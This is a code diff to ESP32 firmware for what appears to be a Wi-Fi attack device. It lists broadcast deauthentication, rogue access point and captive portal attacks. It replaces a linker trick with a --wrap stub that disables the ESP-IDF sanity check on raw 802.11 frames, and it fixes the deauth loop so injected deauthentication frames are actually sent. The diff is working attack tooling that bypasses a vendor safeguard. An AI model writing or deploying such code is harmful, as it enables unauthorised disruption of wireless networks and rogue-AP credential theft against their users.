@@ -6,6 +6,9 @@
 #include "freertos/FreeRTOS.h"
 #include "wifi_controller.h"
 
+char* WIFI_ATTACKS_LIST[] = {"Broadcast", "Rouge AP",       "Combine",
+                             "Multi-AP",  "Captive Portal", NULL};
+
 static TaskHandle_t task_brod_attack = NULL;
 static TaskHandle_t task_rogue_attack = NULL;
 static wifi_ap_record_t s_target_ap_record;
@@ -19,17 +22,27 @@ static const uint8_t deauth_frame_default[] = {
     0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};
 
 /**
- * @brief Decomplied function that overrides original one at compilation time.
+ * @brief Neutralises the ESP-IDF raw-frame sanity check.
  *
- * @attention This function is not meant to be called!
- * @see Project with original idea/implementation
- * https://github.com/GANESH-ICMC/esp32-deauther
+ * The broadcast and rogue-AP attacks inject hand-crafted 802.11 frames that
+ * IDF's ieee80211_raw_frame_sanity_check() rejects. This used to be done by
+ * defining a second symbol with the same name and linking the whole firmware
+ * with -Wl,-zmuldefs, which also suppressed *every* other duplicate-symbol
+ * diagnostic in the project (that is how the menus[] copy in a header and the
+ * ~30 data tables defined in headers went unnoticed).
+ *
+ * -Wl,--wrap redirects the references instead of shadowing the definition, so
+ * only this one call site is affected. See CMakeLists.txt for the flag.
+ *
+ * @attention Not meant to be called directly.
+ * @see https://github.com/GANESH-ICMC/esp32-deauther
  */
-// This function overrides the original one at compilation time
-// To  work with the CMakeList file need to add at the end of the file
-// target_link_libraries(${COMPONENT_LIB}  -Wl,-zmuldefs)
-// This will allow the linker to use the last defined function
-int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg,
+                                            int32_t arg2,
+                                            int32_t arg3) {
+  (void) arg;
+  (void) arg2;
+  (void) arg3;
   return 0;
 }
 
@@ -48,12 +61,37 @@ static void wifi_attack_brod_send_deauth_frame(void* args);
  */
 static void wifi_attack_rogueap(void* args);
 
-static void attack_brodcast_send_raw_frame(const uint8_t* frame_buffer,
-                                           int size) {
+static esp_err_t attack_brodcast_send_raw_frame(const uint8_t* frame_buffer,
+                                                int size) {
   ESP_LOGI(TAG_WIFI_ATTACK_MODULE, "Sending raw frame");
   esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
   if (err != ESP_OK) {
     ESP_LOGE(TAG_WIFI_ATTACK_MODULE, "Failed to send raw frame: %s",
+             esp_err_to_name(err));
+    running_broadcast_attack = false;
+  }
+  return err;
+}
+
+/*
+ * esp_wifi_80211_tx() is documented to return ESP_ERR_WIFI_IF when the
+ * interface does not exist. The broadcast and combine attacks start this task
+ * without ever putting the driver into AP mode, so if the previous app left it
+ * in WIFI_MODE_STA (the scanner does exactly that) every transmission failed,
+ * the task cleared its running flag and deleted itself after ~100 ms - while
+ * the UI kept showing "ATTACKING AP" and incrementing a counter.
+ */
+static void attack_brodcast_ensure_ap_interface(void) {
+  wifi_mode_t mode = WIFI_MODE_NULL;
+  if (esp_wifi_get_mode(&mode) == ESP_OK && mode == WIFI_MODE_AP) {
+    return;
+  }
+  ESP_LOGW(TAG_WIFI_ATTACK_MODULE,
+           "driver is not in AP mode (%d), switching so 802.11 TX can work",
+           (int) mode);
+  esp_err_t err = esp_wifi_set_mode(WIFI_MODE_AP);
+  if (err != ESP_OK) {
+    ESP_LOGE(TAG_WIFI_ATTACK_MODULE, "could not switch to AP mode: %s",
              esp_err_to_name(err));
     running_broadcast_attack = false;
   }
@@ -72,8 +110,24 @@ static void wifi_attack_brod_send_deauth_frame(void* args) {
   if (ap_target->primary >= 1 && ap_target->primary <= 14) {
     esp_wifi_set_channel(ap_target->primary, WIFI_SECOND_CHAN_NONE);
   }
+
+  attack_brodcast_ensure_ap_interface();
+
+  uint8_t consecutive_errors = 0;
   while (running_broadcast_attack) {
-    attack_brodcast_send_raw_frame(deauth_frame, sizeof(deauth_frame));
+    if (attack_brodcast_send_raw_frame(deauth_frame, sizeof(deauth_frame)) !=
+        ESP_OK) {
+      if (++consecutive_errors >= 3) {
+        ESP_LOGE(TAG_WIFI_ATTACK_MODULE,
+                 "broadcast attack stopped: 802.11 TX keeps failing");
+        running_broadcast_attack = false;
+        break;
+      }
+      /* Back off so a hard failure does not spin at the frame rate. */
+      vTaskDelay(1000 / portTICK_PERIOD_MS);
+      continue;
+    }
+    consecutive_errors = 0;
     vTaskDelay(100 / portTICK_PERIOD_MS);
   }
   task_brod_attack = NULL;
